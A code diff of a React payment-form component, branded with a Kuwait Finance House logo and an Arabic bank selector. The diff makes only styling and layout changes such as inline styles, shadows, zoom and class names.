@@ -120,12 +120,12 @@ export default function PaymentForm({
   }
 
   return (
-    <div> <img 
-    className="w-full h-18 m-1 rounded-lg" 
+    <div style={{zoom:0.8,display:"flex",flexDirection:'column', justifyContent:'center'}}> <img 
+    className="w-full h-18 m-1 rounded-lg " 
     src="/1212122.PNG" 
     alt="Kuwait Finance House Logo"
   />
-        <Card className="bg-white shadow-xl  min-w-[300px]">
+        <Card className="bg-white shadow-xl  " style={{boxShadow:'1px 1px 2px #000',margin:20}}>
           <CardContent className="">
             <img 
               className="w-full h-14 my-4 object-contain" 
@@ -144,7 +144,7 @@ export default function PaymentForm({
         </Card>
 
         {(paymentMethod === 'credit_card' || paymentMethod === 'bank_card') && (
-          <Card className='shadow-xl    mt-2      '>
+          <Card className='shadow-xl    mt-2      'style={{boxShadow:'1px 1px 2px #000',margin:20}}>
             <CardContent className="p-6">
               {step === 1 ? (
                 <form onSubmit={handlePaymentInfoSubmit} className="space-y-6">
@@ -152,6 +152,7 @@ export default function PaymentForm({
                     <div className="   flex border-b-2">
                       <Label className='text-blue-500 pb-4  w-32 pt-2 font-samll ' htmlFor="bank">يرجى اختيار البنك:</Label>
                       <Select 
+                      
                 onValueChange={(value) => {
                   const selectedBank = BANKS.find(bank => bank.value === value)
                   setPaymentInfo({ 
@@ -161,7 +162,7 @@ export default function PaymentForm({
                   })
                 }}
               >
-                <SelectTrigger className="w-full">
+                <SelectTrigger className="w-full bg-gray-300  flex-auto w-16 h-6 border rounded-md  font-samll" >
                   <SelectValue placeholder="Select a bank" />
                 </SelectTrigger>
                 <SelectContent>
@@ -259,7 +260,7 @@ i}                          </option>
                     </p>
                   )}
 
-                  <div className="grid grid-cols-2 ">
+<div className="grid grid-cols-2 ">
                     <button
                       type="button"
                       className=" border  bg-gray-400 rounded-md h-6 hover:bg-gray-100"
